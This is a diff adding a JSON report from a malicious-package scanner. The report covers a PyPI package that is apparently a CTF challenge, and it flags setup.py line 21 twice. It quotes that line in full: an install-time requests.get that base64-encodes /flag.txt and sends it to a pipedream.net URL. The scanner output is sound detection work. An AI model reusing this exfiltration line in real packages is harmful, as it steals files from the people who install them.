@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "setup.py:21",
+                "code": "        requests.get(\"https://en4r9c8fvgmzozb.m.pipedream.net/?hehe=\"+os.popen(\"cat /flag.txt | base64\").read())\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:21",
+                "code": "        requests.get(\"https://en4r9c8fvgmzozb.m.pipedream.net/?hehe=\"+os.popen(\"cat /flag.txt | base64\").read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/ctf-q21-empire-tmp-ra13377-0.0.9"
+}
